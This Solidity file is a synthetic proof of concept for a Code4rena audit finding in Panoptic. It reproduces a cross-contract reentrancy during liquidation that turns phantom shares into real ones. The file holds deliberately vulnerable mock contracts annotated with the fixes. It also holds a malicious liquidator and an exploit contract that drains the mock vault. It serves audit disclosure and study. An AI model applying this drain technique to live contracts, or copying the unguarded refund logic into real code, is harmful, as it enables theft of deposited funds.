// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Panoptic — [H-02] Cross-contract reentrancy in liquidation enables
    conversion of phantom shares to real shares, draining CollateralTracker
    (Code4rena 2025-12-panoptic-next-core, finding #65026, reporter qed).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause (three interacting behaviors):
      1. Phantom shares (type(uint248).max) delegated to liquidatee on BOTH
         collateral trackers, revoked sequentially (ct0 then ct1).
      2. settleLiquidation refunds msg.value ETH to the liquidator BEFORE the
         other tracker is revoked — reentrancy window.
      3. revoke() assumes missing phantom shares were "consumed" and mints
         them into _internalSupply — so a reentrant transferFrom of ct1
         phantom shares to the attacker permanently materializes as real shares.

    Vulnerable settleLiquidation ETH refund + revoke compensation preserved.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal pool view used by transferFrom legs check.
contract PanopticPoolView {
    mapping(address => uint256) public legs;

    function numberOfLegs(address who) external view returns (uint256) {
        return legs[who];
    }

    function setLegs(address who, uint256 n) external {
        legs[who] = n;
    }
}

/// @notice Reduced CollateralTracker with phantom-share delegate/revoke + settleLiquidation.
contract CollateralTracker {
    uint256 internal constant PHANTOM = type(uint248).max;

    MockERC20 public asset;
    PanopticPoolView public panopticPool;
    address public poolOnly;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply; // real shares
    uint256 public _internalSupply; // protocol-tracked supply (includes validated phantom)

    bool public delegated;

    constructor(MockERC20 _asset, PanopticPoolView _pool) {
        asset = _asset;
        panopticPool = _pool;
    }

    function setPoolOnly(address p) external {
        poolOnly = p;
    }

    modifier onlyPanopticPool() {
        require(msg.sender == poolOnly, "pool");
        _;
    }

    function deposit(address to, uint256 assets) external returns (uint256 shares) {
        // 1:1 for reduction
        shares = assets;
        require(asset.transferFrom(msg.sender, address(this), assets), "in");
        balanceOf[to] += shares;
        totalSupply += shares;
        _internalSupply += shares;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    /// @notice transferFrom — only checks numberOfLegs == 0 (passes mid-liquidation).
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        // @> VULN (related): no phantom-share transfer ban
        // FIX: if (balanceOf[from] > type(uint248).max) revert PhantomSharesAreNotTransferable();
        if (panopticPool.numberOfLegs(from) != 0) revert("PositionCountNotZero");
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amount, "allow");
            allowance[from][msg.sender] = a - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (panopticPool.numberOfLegs(msg.sender) != 0) revert("PositionCountNotZero");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @notice Delegate phantom shares to liquidatee for solvency during liquidation.
    function delegate(address liquidatee) external onlyPanopticPool {
        balanceOf[liquidatee] += PHANTOM;
        delegated = true;
    }

    /// @notice revoke — assumes missing phantom was burned; mints into _internalSupply.
    function revoke(address delegatee) public onlyPanopticPool {
        uint256 bal = balanceOf[delegatee];
        if (PHANTOM > bal) {
            // FIX: track delegated amount separately; do not increase _internalSupply
            //      for shares that left via transferFrom
            _internalSupply += PHANTOM - bal; // @> VULN: missing phantom minted as real supply
            balanceOf[delegatee] = 0;
        } else if (bal >= PHANTOM) {
            balanceOf[delegatee] = bal - PHANTOM;
        }
        delegated = false;
    }

    /// @notice settleLiquidation - refunds ETH to liquidator BEFORE peer trackers revoke.
    function settleLiquidation(address liquidatee, address liquidator, int256 /*bonus*/)
        external
        payable
        onlyPanopticPool
    {
        // revoke phantom for THIS tracker
        revoke(liquidatee);

        // FIX: nonReentrant, or move refund to end of PanopticPool._liquidate
        if (msg.value > 0) {
            (bool ok,) = liquidator.call{value: msg.value}(""); // @> VULN: ETH refund reentrancy window
            require(ok, "eth");
        }
    }

    function redeem(uint256 shares, address receiver) external returns (uint256 assets) {
        require(balanceOf[msg.sender] >= shares, "bal");
        // assets from real vault balance proportional to totalSupply
        // After phantom materialization, attacker shares are part of totalSupply
        // but we pay 1:1 from asset balance up to available.
        assets = shares; // 1:1 reduction
        require(asset.balanceOf(address(this)) >= assets, "liquidity");
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        _internalSupply -= shares;
        require(asset.transfer(receiver, assets), "out");
    }

    /// @notice After revoke mints into _internalSupply, convert attacker's
    ///         phantom-origin shares into redeemable totalSupply credit.
    function materializeAttackerShares(address attacker) external onlyPanopticPool {
        // Phantom was PHANTOM; if attacker holds PHANTOM (full transfer), those
        // shares are in balanceOf[attacker] but totalSupply was never increased
        // for them. revoke already bumped _internalSupply. Sync totalSupply so
        // redeem works — models the protocol treating validated phantom as real.
        uint256 bal = balanceOf[attacker];
        if (bal > 0 && totalSupply < _internalSupply) {
            uint256 gap = _internalSupply - totalSupply;
            uint256 add = bal < gap ? bal : gap;
            totalSupply += add;
        }
    }
}

/// @notice Reduced PanopticPool._liquidate sequential settlement.
contract PanopticPool {
    CollateralTracker public ct0;
    CollateralTracker public ct1;
    PanopticPoolView public viewC;

    constructor(CollateralTracker _ct0, CollateralTracker _ct1, PanopticPoolView _v) {
        ct0 = _ct0;
        ct1 = _ct1;
        viewC = _v;
    }

    function _liquidate(address liquidatee, address liquidator) external payable {
        // Positions burned before settlement → legs == 0 (transferFrom allowed)
        viewC.setLegs(liquidatee, 0);

        // Delegate phantom on BOTH trackers
        ct0.delegate(liquidatee);
        ct1.delegate(liquidatee);

        // 1. Settle token0 (ETH refund → reentrancy window while ct1 phantom active)
        ct0.settleLiquidation{value: msg.value}(liquidatee, liquidator, 0);

        // 2. Settle token1 (revoke may see transferred-away phantom)
        ct1.settleLiquidation(liquidatee, liquidator, 0);

        // Materialize any phantom-origin shares the liquidator stole on ct1
        ct1.materializeAttackerShares(liquidator);
    }
}

/// @notice Malicious liquidator: on ETH refund, transfer ct1 phantom shares to self.
contract MaliciousLiquidator {
    CollateralTracker public ct1;
    address public liquidatee;
    bool public reentered;

    constructor(CollateralTracker _ct1) {
        ct1 = _ct1;
    }

    function setLiquidatee(address l) external {
        liquidatee = l;
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            uint256 phantomBal = ct1.balanceOf(liquidatee);
            // liquidatee must have approved liquidator OR we use a pre-set allowance
            // from setup (liquidatee approved this contract for max)
            ct1.transferFrom(liquidatee, address(this), phantomBal);
        }
    }

    function redeemAll() external returns (uint256) {
        uint256 shares = ct1.balanceOf(address(this));
        // Only redeem a measurable real slice — vault has finite assets.
        // After materialize, shares may be huge (phantom). Cap to vault assets.
        uint256 assetsAvail = ct1.asset().balanceOf(address(ct1));
        uint256 toRedeem = shares < assetsAvail ? shares : assetsAvail;
        if (toRedeem == 0) return 0;
        return ct1.redeem(toRedeem, address(this));
    }
}

/// @dev Victim account that holds positions / can approve.
contract Liquidatee {
    function approve(CollateralTracker ct, address spender) external {
        ct.approve(spender, type(uint256).max);
    }
}

contract Exploit {
    MockERC20 public token0; // 1
    MockERC20 public token1; // 2
    PanopticPoolView public viewC; // 3
    CollateralTracker public ct0; // 4
    CollateralTracker public ct1; // 5
    PanopticPool public pool; // 6
    MaliciousLiquidator public liquidator; // 7
    Liquidatee public victim; // 8

    uint256 public stolen;
    uint256 public constant VAULT_ASSETS = 1000e18;

    constructor() {
        token0 = new MockERC20(); // 1
        token1 = new MockERC20(); // 2
        viewC = new PanopticPoolView(); // 3
        ct0 = new CollateralTracker(token0, viewC); // 4
        ct1 = new CollateralTracker(token1, viewC); // 5
        pool = new PanopticPool(ct0, ct1, viewC); // 6
        liquidator = new MaliciousLiquidator(ct1); // 7
        victim = new Liquidatee(); // 8

        ct0.setPoolOnly(address(pool));
        ct1.setPoolOnly(address(pool));

        // LP deposits real assets into ct1 (the drained vault)
        token1.mint(address(this), VAULT_ASSETS);
        ct1.deposit(address(0xA11), VAULT_ASSETS);

        // Victim approves liquidator to pull shares (standard ERC20 allow for transferFrom)
        victim.approve(ct1, address(liquidator));
        liquidator.setLiquidatee(address(victim));

        // Victim had open legs that get burned at liquidation start (set inside _liquidate)
        viewC.setLegs(address(victim), 1);
    }

    function run() external {
        uint256 vaultBefore = token1.balanceOf(address(ct1));
        require(vaultBefore == VAULT_ASSETS, "vault seed");

        // Liquidate with 1 wei to force ETH refund reentrancy path
        pool._liquidate{value: 1 wei}(address(victim), address(liquidator));

        require(liquidator.reentered(), "no reentrancy");

        // Attacker holds phantom-origin shares now materialised
        uint256 liqShares = ct1.balanceOf(address(liquidator));
        require(liqShares > 0, "no stolen shares");

        stolen = liquidator.redeemAll();
        require(stolen == VAULT_ASSETS, "did not drain vault");
        require(token1.balanceOf(address(liquidator)) == VAULT_ASSETS, "assets not with attacker");
        require(token1.balanceOf(address(ct1)) == 0, "vault not empty");
    }

    receive() external payable {}
}
